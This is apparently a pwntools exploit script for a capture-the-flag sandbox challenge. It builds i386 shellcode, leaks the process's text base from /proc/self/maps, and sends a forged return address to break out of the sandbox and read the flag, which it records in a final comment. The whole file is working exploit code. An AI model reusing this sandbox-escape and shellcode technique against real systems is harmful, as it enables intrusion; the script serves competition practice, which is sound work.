#!/usr/bin/env python2

from pwn import *
import sys
import os

host, port = 'sandbox-compat.ctfcompetition.com', 1337
local = False
if len(sys.argv) == 1:
  host = '127.0.0.1'
  local = True

context.arch = 'i386'
r = remote(host, port)

payload = asm(
"""
    mov esp, 0xbef00000 - 0x200
""" +
    shellcraft.pushstr('/proc/self/maps') +
    #  shellcraft.pushstr('/etc/os-release') +
"""
    mov esi, esp
    call open
    mov ebp, eax
    mov esi, ebp /* fd */
    mov edx, esp
    mov ecx, 124 /* dummy */
    call read

    mov esi, ebp /* fd */
    mov edx, esp
    mov ecx, 12
    call read

    mov esi, 1
    mov edx, esp
    mov ecx, eax
    call write

    mov esi, 0
    mov edx, esp
    mov ecx, 0x10
    call read /* read return address */

    std /* Yoooooo! */
    mov esi, esp
    add esi, 8
    call open

    mov esi, eax /* open("flag")'s fd */
    mov edx, esp
    mov ecx, 0x100
    call read

    mov esi, 1
    mov edx, esp
    mov ecx, eax
    call write

    call exit
write:
    mov edi, 1
    call syscall
    ret
open:
    mov edi, 2
    call syscall
    ret
read:
    mov edi, 0
    call syscall
    ret
exit:
    mov edi, 0xe7 /* exit_group */
    mov esi, 217
    call syscall
syscall:
    xor eax, eax
    dec eax
    shl eax, 12
    push eax
    ret
"""
)

#  context.log_level = 'debug'

context.clear(arch = 'amd64')
r.recvuntil('code!\n')
r.send(payload + 'deadbeef')
r.recvuntil("[*] let's go...\n")
text_base = u64(unhex(r.recvn(12))[::-1] + '\0\0')
log.info('text base: ' + hex(text_base))
#  raw_input()
log.info("Sending forged address..")
r.send(flat(
    text_base + 0x13d7,
    "flag".ljust(8, '\x00'),
))

r.interactive()

# CTF{Hell0_N4Cl_Issue_51!}
